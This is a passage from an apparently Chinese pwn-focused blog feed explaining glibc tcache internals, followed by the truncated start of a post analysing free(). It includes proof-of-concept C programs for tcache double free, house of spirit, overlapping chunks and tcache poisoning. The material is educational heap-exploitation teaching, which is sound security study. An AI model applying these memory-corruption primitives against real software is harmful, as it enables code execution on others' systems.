tc_idx &lt; mp_.tcache_bins  <span class="comment">// 64 ，最多 64 个 bin</span></span><br><span class="line">&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="comment">// 7 ，tcache-&gt;counts 存放每个 bin 已经存放的 chunk数量</span></span><br><span class="line">      &#123;</span><br><span class="line">tcache_put (p, tc_idx);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>删掉了一些没影响的代码</p><ul><li>首先就是获取要释放的 <code>chunk</code> 的 <code>size</code> , 然后判断 <code>size</code> 是否符和规范（是否对齐之类的 <code>check</code> )， 如果合规就看 <code>tcache-&gt;counts[tc_idx]</code> 是否已经满了 ，如果没有满就直接放入 <code>tcache</code> ， 然后返回。</li><li>否则就和没有 <code>tcache</code> 是一样的处理</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在 <code>free</code> 的时候，会检测 <code>p</code> 的下一个 <code>chunk( next )</code> 的 <code>PREV_INUSE</code> 位，但是如果 <code>chunk</code> 被放入了 tcache ，<code>next-&gt;PREV_INUSE</code> 位不会被修改 ，所以还是会标志为 <code>in_used</code> . 所以我们可以 <strong>多次释放同一个 <code>chunk</code> .</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">  size = chunksize (p);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">"free(): invalid pointer"</span>);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    malloc_printerr (<span class="string">"free(): invalid size"</span>);</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk(av, p); <span class="comment">// 通过下一个 chunk 的 pre_inused 位，判断当前 chunk 释放已经被释放</span></span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);  <span class="comment">// tcache bin 的索引</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">&amp;&amp; tc_idx &lt; mp_.tcache_bins  <span class="comment">// 64 ，最多 64 个 bin</span></span><br><span class="line">&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="comment">// 7 ，tcache-&gt;counts 存放每个 bin 已经存放的 chunk数量</span></span><br><span class="line">      &#123;</span><br><span class="line">tcache_put (p, tc_idx);  <span class="comment">// 如果 chunk 被放入了 tcache ，next-&gt;pre_inuse 不会被修改。</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>同时在 <code>malloc</code> 的时候 ，先尝试 <code>tcache</code> 分配</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>这也使得很多安全检测不会被执行。</p><h2 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache_dup"></a>tcache_dup</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>通过 <code>free</code> 2次同一个 <code>chunk</code> ， 使得可以让两个指针分配到同一块内存</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">void</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">        <span class="built_in">free</span>(p1);</span><br><span class="line">        <span class="built_in">free</span>(p1);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Next allocated memory will be same: %p %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x40</span>), <span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>通过 <code>_int_free</code> 的源码我们知道， 在 <code>free</code> 的时候，会检测 <code>p</code> 的下一个 <code>chunk</code> ( <code>next</code> ) 的 <code>PREV_INUSE</code> 位</li><li>然后如果 <code>tcache</code> 指定项没有满就把 <code>chunk</code> 加入 <code>tcache</code></li><li>但是如果 <code>chunk</code> 被放入了 <code>tcache</code> ，<code>next-&gt;PREV_INUSE</code> 位不会被修改 ，所以还是会标志为 <code>in_used</code> . 所以我们可以 <strong>多次释放同一个 <code>chunk</code> .</strong></li></ul><p>所以我们释放两次 <code>p1</code> , 此时 <code>tcache</code> 里面 <code>size</code> 为 <code>0x50</code> ( <code>chunk</code> 大小) 的项中就有 两个 一样 <code>chunk</code></p><p>然后分配两次一样大小的 <code>chunk</code>， <code>malloc</code> 会先用 <code>tcache</code> 分配，就会拿到两个一样的 <code>chunk</code></p><p>可以看到分配到了两个地址一样的 <code>chunk</code> .</p><h2 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>通过伪造 <code>size</code> ，然后 <code>free</code> 掉这个 伪造的 <code>chunk</code> , 然后再分配 <code>size</code> 大小的 <code>chunk</code> , 就可以分配到指定位置。</p><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><p>首先看看源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> fake_chunk_and_more[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">memset</span>(fake_chunk_and_more, <span class="string">'A'</span>, <span class="keyword">sizeof</span>(fake_chunk_and_more));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"stack buf: %p\n"</span>, (<span class="keyword">void</span> *)fake_chunk_and_more);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span>* fake_chunk = (<span class="keyword">char</span> * )fake_chunk_and_more;</span><br><span class="line">    *(<span class="keyword">long</span> *)(fake_chunk + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">0x110</span>;</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> *)(fake_chunk + <span class="number">0x110</span> + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">0x40</span>;  <span class="comment">// 设置 pre_inused 位</span></span><br><span class="line">    <span class="keyword">char</span> *mem = fake_chunk + <span class="number">2</span>*<span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line">    <span class="built_in">free</span>(mem);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> *mem2 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc(0x100) returned: %p\n"</span>, mem2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是在栈上面（用栈只是为了方便）伪造了 一个 <code>0x110</code> 大小 <code>chunk</code>，</p><p>然后把它释放掉，他就会进入 <code>tcache</code> ,然后分配 <code>0x110</code> 的 <code>chunk</code> 就可以 分配到 <code>fake_chunk_and_more</code> 的地址</p><p>可以看到分配到了<code>fake_chunk_and_more</code> .</p><p>调试过程的内存状态</p><p>熟悉 <code>malloc</code> 管理机制的老哥们可以比较奇怪，这里把 <code>next_chunk-&gt;pre_inused = 0</code> ( <code>size = 0x40</code> ) 。</p><p>在 源码里面是有通过 <code>check_inuse_chunk</code> 检测是否 <code>double free</code> 的 代码的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  size = chunksize (p);</span><br><span class="line">  ....................................................</span><br><span class="line">  ....................................................</span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line">  <span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);  <span class="comment">// tcache bin 的索引</span></span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">&amp;&amp; tc_idx &lt; mp_.tcache_bins  <span class="comment">// 64 ，最多 64 个 bin</span></span><br><span class="line">&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="comment">// 7 ，tcache-&gt;counts 存放每个 bin 已经存放的 chunk数量</span></span><br><span class="line">      &#123;</span><br><span class="line">tcache_put (p, tc_idx);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>但是从 <code>ida</code> 里面去看，居然不见了，校验 <code>chunk</code> 的 <code>size</code> 和 指针 后就直接进入 <code>tcache</code> 的处理的流程， 于是这里就算设置 下一个<code>chunk</code> 的 <code>next_chunk-&gt;pre_inuse = 0</code> ,也不会出现 <code>crash</code> 。</p><h2 id="overlapping-chunks-by-caching"><a href="#overlapping-chunks-by-caching" class="headerlink" title="overlapping_chunks_by_caching"></a>overlapping_chunks_by_caching</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><p><code>overlapping_chunks</code> 这种技术非常经典了， 不过在 <code>tcache</code> 里面就非常的简单了， 修改 <code>chunk</code> 的 <code>size</code> 为 <code>fake_size</code> ， 然后 <code>free</code> 掉它，就会进入 <code>fake_size</code> 对应的 <code>tcache</code> ， 然后在 分配 <code>fake_size</code> 的 <code>chunk</code> 就可以拿到这个 <code>chunk</code> , <strong>overlap chunk</strong></p><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *mem = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="keyword">char</span> *sentry = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="built_in">memset</span>(sentry, <span class="string">'b'</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mem: %p, sentry: %p\n"</span>,mem, sentry);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"sentry content: %s\n"</span>, sentry);</span><br><span class="line">    *(<span class="keyword">long</span>* )(mem - <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">0x110</span>;  <span class="comment">// 设置 chunk-&gt;size = 0x110</span></span><br><span class="line">    <span class="built_in">free</span>(mem);</span><br><span class="line">    <span class="keyword">char</span> *mem2 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);  <span class="comment">// 分配一个 0x110 的chunk</span></span><br><span class="line">    <span class="built_in">memset</span>(mem2, <span class="string">'a'</span>, <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mem2: %p\n"</span>, mem2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"sentry content: %s\n"</span>, sentry);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过修改 <code>mem</code> 所在 <code>chunk</code> 的 <code>size</code> 为 <code>0x110</code></p><p>然后释放掉他 ，然后分配一个 <code>0x110</code> 的 <code>chunk</code> ，我们就会再次分配到它。此时 <code>mem2</code> 的 <code>chunk</code> 包含了 <code>sentry</code> 的 <code>chunk</code></p><h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h2><h3 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h3><p>通过修改 <code>free</code> 状态的 <code>tcache</code> 里面的 <code>chunk</code> 的 <code>fd</code> （其实就是 <code>tcache_entry-&gt;next</code> ) ，可以分配到任意地址</p><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> target[<span class="number">6</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"stack: %p\n"</span>,target);</span><br><span class="line">    <span class="keyword">char</span> *mem = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="built_in">free</span>(mem);</span><br><span class="line">    *(<span class="keyword">long</span> *)(mem) = (<span class="keyword">long</span>)target; </span><br><span class="line">    <span class="keyword">char</span> *mem1 = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="keyword">char</span> *mem2 = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mem2: %p\n"</span>, mem2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分配一个 <code>0x50</code> 的 <code>chunk</code> 然后释放它，进入 <code>tcache</code> ，然后修改 <code>fd</code> 为 <code>target</code></p><p>然后分配两次 <code>0x50</code> 的 <code>chunk</code> 就可以分配到 <code>target</code></p><p>成功分配到了 栈上面。</p><p>其实 <code>fd</code> 为任意地址都行，原因在于 <code>tcache_get</code> 直接从 <code>tcache-&gt;entries</code> 里面拿 <code>chunk</code> ， 而不检查 拿到的 <code>chunk</code> 是否合法。</p><p>同时 在 <code>malloc</code> 分配内存时，首先使用 <code>tcache</code> ，而它判断 <code>tcache</code> 有没有可以分配的 <code>chunk</code> , 是直接判断指定项有没有指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>) <span class="comment">// 根据tcache-&gt;entries[tc_idx]是否为空判断是否有chunk</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><h1 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h1><p><code>tcache</code> 的引入使得 <code>heap</code> 相关的漏洞的利用非常的简单了。</p><p>简单的原因主要在于 <code>tcache</code> 里面没有做什么检查， 同时还会优先使用这使得原来 <code>malloc</code> 里面的 <code>check</code> 也没有了作用。</p><p><code>free</code> 的话 释放内存如果大小在 <code>tcache</code> 的范围内， 只检测 <strong>size 和 指针</strong> 是否合法，而且检测非常弱。</p><p><code>malloc</code> 时 也是优先使用 <code>tcache</code> ， 只要 <code>tcache-&gt;entries[tc_idx]</code> 非空就可以从 <code>tcache</code> 分配。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a><strong>参考</strong></h1><p><a href="http://tukan.farm/2017/07/08/tcache/" target="_blank" rel="noopener">http://tukan.farm/2017/07/08/tcache/</a></p><p><a href="https://www.anquanke.com/post/id/104760" target="_blank" rel="noopener">https://www.anquanke.com/post/id/104760</a></p><p><a href="https://www.cnblogs.com/hac425/p/9416796.html" target="_blank" rel="noopener">https://www.cnblogs.com/hac425/p/9416796.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&lt;code&gt;glibc 2.26&lt;/code&gt; 开始引入了 &lt;code&gt;tcache&lt;/code&gt; , 相关的 commit 可以看&lt;br&gt;
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>free源码简单分析</title>
    <link href="https://nocbtm.github.io/2020/02/26/free%E6%BA%90%E7%A0%81%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/"/>
    <id>https://nocbtm.github.io/2020/02/26/free源码简单分析/</id>
    <published>2020-02-26T11:14:51.000Z</published>
    <updated>2020-04-07T03:39:47.606Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GI-libc-free"><a href="#GI-libc-free" class="headerlink" title="_GI___libc_free"></a>_GI___libc_free</h2><p>首先是 _GI___libc_free</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall _GI___libc_free(<span class="keyword">void</span> *ptr)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( _free_hook )</span><br><span class="line">  &#123;</span><br><span class="line">    _free_hook(ptr, retaddr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = (<span class="keyword">unsigned</span> __int64)ptr - <span class="number">16</span>;</span><br><span class="line">    v2 = *((_QWORD *)ptr - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v2 &amp; <span class="number">2</span> )                               <span class="comment">// 判断size位，判断是不是 mmap 获得的 chunk</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !mp_.no_dyn_threshold</span><br><span class="line">        &amp;&amp; v2 &gt; mp_.mmap_threshold</span><br><span class="line">        &amp;&amp; v2 &lt;= <span class="number">0x2000000</span></span><br><span class="line">        &amp;&amp; (v1 &lt; (<span class="keyword">unsigned</span> __int64)dumped_main_arena_start || v1 &gt;= (<span class="keyword">unsigned</span> __int64)dumped_main_arena_end) )</span><br><span class="line">      &#123;</span><br><span class="line">        mp_.mmap_threshold = v2 &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL;</span><br><span class="line">        mp_.trim_threshold = <span class="number">2</span> * (v2 &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL);</span><br><span class="line">      &#125;</span><br><span class="line">      munmap_chunk((mchunkptr)((<span class="keyword">char</span> *)ptr - <span class="number">16</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      av = &amp;main_arena;</span><br><span class="line">      <span class="keyword">if</span> ( v2 &amp; <span class="number">4</span> )</span><br><span class="line">        av = *(malloc_state **)(v1 &amp; <span class="number">0xFFFFFFFFFC000000</span>LL);</span><br><span class="line">      int_free(av, (mchunkptr)v1, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果存在 free_hook ， 就会直接调用 free_hook(ptr) 然后返回。否则判断被 free 的 内存是否是 mmap 获取的 ，如果是则使用 munmap_chunk 回收内存，否则进入 _int_free</p><h2 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h2><p>首先会做一些简单的检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> size = chunksize (p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//检查指针是否正常，对齐</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">"free(): invalid pointer"</span>;</span><br><span class="line">    errout:</span><br><span class="line">      <span class="keyword">if</span> (!have_lock &amp;&amp; locked)</span><br><span class="line">        (<span class="keyword">void</span>) mutex_unlock (&amp;av-&gt;mutex);</span><br><span class="line">      malloc_printerr (check_action, errstr, chunk2mem (p), av);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查 size 是否 &gt;= MINSIZE ，且是否对齐</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">"free(): invalid size"</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查 chunk 是否处于 inuse 状态</span></span><br><span class="line">  check_inuse_chunk(av, p);</span><br></pre></td></tr></table></figure><p>检查</p><ul><li>指针是否对齐</li><li>块的大小是否对齐，且大于最小的大小</li><li>块是否在 inuse 状态</li></ul><h2 id="进入-fastbin"><a href="#进入-fastbin" class="headerlink" title="进入 fastbin"></a>进入 fastbin</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 